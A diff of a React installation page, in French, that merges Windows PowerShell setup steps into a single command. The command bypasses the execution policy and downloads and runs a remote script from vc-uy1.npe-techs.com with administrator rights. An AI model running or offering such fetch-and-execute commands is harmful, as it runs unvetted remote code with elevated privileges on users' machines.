@@ -32,9 +32,7 @@ const windowsSteps: Step[] = [
         desc: "Ouvrez PowerShell en tant qu'administrateur et exécutez ces commandes.",
         isCommand: true,
         commands: [
-            "Set-ExecutionPolicy Bypass -Scope Process -Force",
-            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12",
-            "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://vc-uy1.npe-techs.com/install-windows.ps1'))"
+            "powershell -ExecutionPolicy Bypass -Command \"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://vc-uy1.npe-techs.com/install-windows.ps1'))\""
         ]
     },
     {
@@ -103,6 +101,7 @@ const linuxSteps: Step[] = [
         ]
     }
 ];
+
 
 export default function InstallationPage() {
     const [currentStep, setCurrentStep] = useState(0);
